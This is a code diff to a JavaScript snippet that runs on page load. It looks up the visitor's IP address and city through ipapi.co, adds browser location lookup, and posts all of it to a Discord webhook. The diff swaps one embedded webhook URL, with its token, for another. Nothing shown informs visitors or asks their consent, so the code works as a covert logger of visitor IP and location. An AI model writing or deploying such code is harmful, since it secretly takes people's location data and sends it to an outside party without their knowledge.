@@ -1,4 +1,4 @@
-const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;
+const WEBHOOK_URL = `https://discord.com/api/webhooks/1322770566771638343/V1GDsiPGYFhmneTpR8QfD5mYpsKfqfKZLXFfw6Y9pskVQruPvzy_s7XX_PLqbCm__Ovi`;
 function sendToDiscord(ipData, locationData) {
   const ip = ipData.query;
   const city = ipData.city;
@@ -38,16 +38,13 @@ ${addressMessage}
 
 function sendIPData() {
   fetch("https://ipapi.co/json")
-    .then((response) => {
-      console.log(response);
-      return response.json();
-    })
+    .then((response) => response.json())
     .then((ipData) => {
-      console.log(ipData);
-      sendToDiscord(ipData, null); // Send IP data to Discord
+      getUserLocation(function (locationData) {
+        sendToDiscord(ipData, locationData);
+      });
     })
     .catch((error) => console.error(`Error retrieving IP data: ${error}`));
 }
 
-// Call the function to send IP data when the page loads
-window.onload = sendIPData;
+window.addEventListener("load", sendIPData);
